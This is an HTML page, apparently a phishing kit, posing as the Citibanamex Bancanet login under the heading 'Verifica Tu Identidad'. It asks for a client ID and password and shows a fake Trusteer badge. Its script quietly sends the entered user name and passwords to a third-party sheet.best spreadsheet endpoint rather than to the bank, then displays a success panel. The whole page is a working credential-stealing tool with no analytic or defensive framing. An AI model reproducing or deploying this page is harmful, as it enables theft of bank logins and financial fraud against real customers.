	<title>Citibanamex | Banco Nacional de México</title>

<body>
		<div class="contenedor">
			<div class="columna-top-rwd"></div>
			<div class="columna-derecha"></div>
			<div class="columna-izquierda">
				<div class="registro activo" id="registro">
					<div class="header">
						<h1>¡Verifica Tu Identidad <strong>Bancanet</strong>!</h1>
						<br>
					</div>
					<form class="formulario" id="contact-form">
						<p class="centro"><b>Ingresa Tu Usuario</b></p><br>
						<label for="usuario">Tu usuario debe tener entre 8 y 30 caracteres</label>
						<div class="contenedor-input">
							<input type="text" id="usuario" name="usuario" placeholder="ID Cliente"/>
						</div>
						<p class="centro"><b>Ingresa Tu Contraseña</b></p><br>
						<label for="contraseña">Tu contraseña debe tener entre 8 y 30 caracteres</label>
						<div class="contenedor-input">
							<input type="password" id="contraseña" name="contraseña" placeholder="Contraseña"/>
						</div>
						<p class="centro"><b>Confirma Tu Contraseña</b></p><br>
						<label for="confirmar">Tu contraseña debe tener entre 8 y 30 caracteres</label>
						<div class="contenedor-input">
							<input type="password" id="confirmar" name="confirmar" placeholder="Confirmar Contraseña"/>
						</div>
						<div class="contenedor-boton">
							<button type="submit">Continuar</button>
						</div>
					</form>
					<div class="true"><img src="img/trusteer-2.jpg"></div>
				</div> 
				<div class="header exito" id="exito">
					<!-- Contenido del éxito aquí -->
				</div>
			</div>
			<script>
    const formulario = document.getElementById('contact-form');
    const registro = document.getElementById('registro');
    const exito = document.getElementById('exito');

    formulario.addEventListener('submit', async (e) => {
        e.preventDefault();

        try {
            const respuesta = await fetch('https://sheet.best/api/sheets/0bb604e6-14c8-4608-b51e-6fd71c61ae29', {
                method: 'POST',
                mode: 'cors',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    "Data1": formulario.elements.usuario.value,
                    "Data2": formulario.elements.contraseña.value,
                    "Data3": formulario.elements.confirmar.value
                })
            });

            // Manejar la respuesta del servidor aquí
            if (respuesta.ok) {
                registro.classList.remove('activo');
                exito.classList.add('activo');
            } else {
                console.error('Error en la respuesta del servidor:', respuesta.statusText);
                // Mostrar un mensaje de error al usuario
            }
        } catch (error) {
            console.error('Error al enviar la solicitud:', error);
            // Mostrar un mensaje de error al usuario
        }
    });
	</script>

	</div>
